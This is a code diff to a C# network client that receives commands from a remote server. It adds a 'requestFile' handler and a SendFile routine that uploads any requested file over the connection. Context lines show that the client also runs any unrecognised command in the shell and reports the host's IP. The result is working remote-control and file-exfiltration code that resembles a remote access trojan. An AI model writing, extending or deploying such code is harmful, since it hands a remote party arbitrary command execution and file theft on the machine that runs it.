@@ -87,6 +87,32 @@ class Client
                                 Console.WriteLine("[Client] Stream Mode Deactivated.");
                             }
 
+                            else if (incomingCommand.StartsWith("requestFile ", StringComparison.OrdinalIgnoreCase))
+                            {
+                                Console.WriteLine("Requested file: " + incomingCommand);
+                                try
+                                {
+                                    string[] parts = incomingCommand.Split(new char[] { ' ' }, 2);
+
+                                    if (parts.Length == 2)
+                                    {
+                                        string fileName = parts[1].Trim();
+
+                                        Console.WriteLine("Requested file: " + fileName);
+
+                                        SendFile(stream, fileName);
+                                    }
+                                    else
+                                    {
+                                        Console.WriteLine("Missing file name.");
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    Console.WriteLine("[Client] ERROR:");
+                                    Console.WriteLine(ex.ToString());
+                                }
+                            }
                             else{
                                 Console.WriteLine("[Client] Unknown command received, running it in the shell: " + incomingCommand);
                                 try
@@ -139,6 +165,36 @@ class Client
         byte[] sizeHeader = BitConverter.GetBytes(ipBytes.Length);
         stream.Write(sizeHeader, 0, sizeHeader.Length);
         stream.Write(ipBytes, 0, ipBytes.Length);
+        stream.Flush();
+    }
+
+    public static void SendFile(NetworkStream stream, string filePath)
+    {
+        string fileName = Path.GetFileName(filePath);
+
+        byte[] nameBytes = Encoding.UTF8.GetBytes(fileName);
+        byte[] nameLength = BitConverter.GetBytes(nameBytes.Length);
+
+        FileInfo fi = new FileInfo(filePath);
+        byte[] fileSize = BitConverter.GetBytes(fi.Length);
+
+        // Send metadata
+        stream.Write(nameLength, 0, nameLength.Length);
+        stream.Write(nameBytes, 0, nameBytes.Length);
+        stream.Write(fileSize, 0, fileSize.Length);
+
+        // Send file contents
+        using (FileStream fs = File.OpenRead(filePath))
+        {
+            byte[] buffer = new byte[8192];
+            int read;
+
+            while ((read = fs.Read(buffer, 0, buffer.Length)) > 0)
+            {
+                stream.Write(buffer, 0, read);
+            }
+        }
+
         stream.Flush();
     }
 
